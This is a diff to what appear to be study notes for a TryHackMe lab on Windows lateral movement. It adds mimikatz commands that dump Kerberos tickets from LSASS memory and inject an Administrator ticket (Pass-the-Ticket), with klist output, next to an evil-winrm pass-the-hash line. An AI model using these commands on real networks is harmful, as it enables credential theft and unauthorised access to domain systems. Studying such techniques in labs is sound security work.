@@ -242,6 +242,8 @@ Connect to WinRM using PtH:
 `evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH`
 
 ### Kerberos Authentication
+
+
 #### Pass-the-Ticket
 Sometimes it will be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz. The process usually requires us to have SYSTEM privileges on the attacked machine and can be done as follows:
 ```
@@ -249,3 +251,31 @@ mimikatz # privilege::debug
 mimikatz # sekurlsa::tickets /export
 ```
 `/export`: output the file "tickets.kirbi"
+Once we have extracted the desired ticket, we can inject the tickets into the current session with the following command:
+```
+mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
+```
+Injecting tickets in our own session doesn't require administrator privileges. After this, the tickets will be available for any tools we use for lateral movement. To check if the tickets were correctly injected, you can use the klist command:
+```
+za\bob.jenkins@THMJMP2 C:\> klist
+
+Current LogonId is 0:0x1e43562
+
+Cached Tickets: (1)
+
+#0>     Client: Administrator @ ZA.TRYHACKME.COM
+        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 4/12/2022 0:28:35 (local)
+        End Time:   4/12/2022 10:28:35 (local)
+        Renew Time: 4/23/2022 0:28:35 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called: THMDC.za.tryhackme.com
+```
+
+### Overpass-the-hash / Pass-the-Key
+
+
+
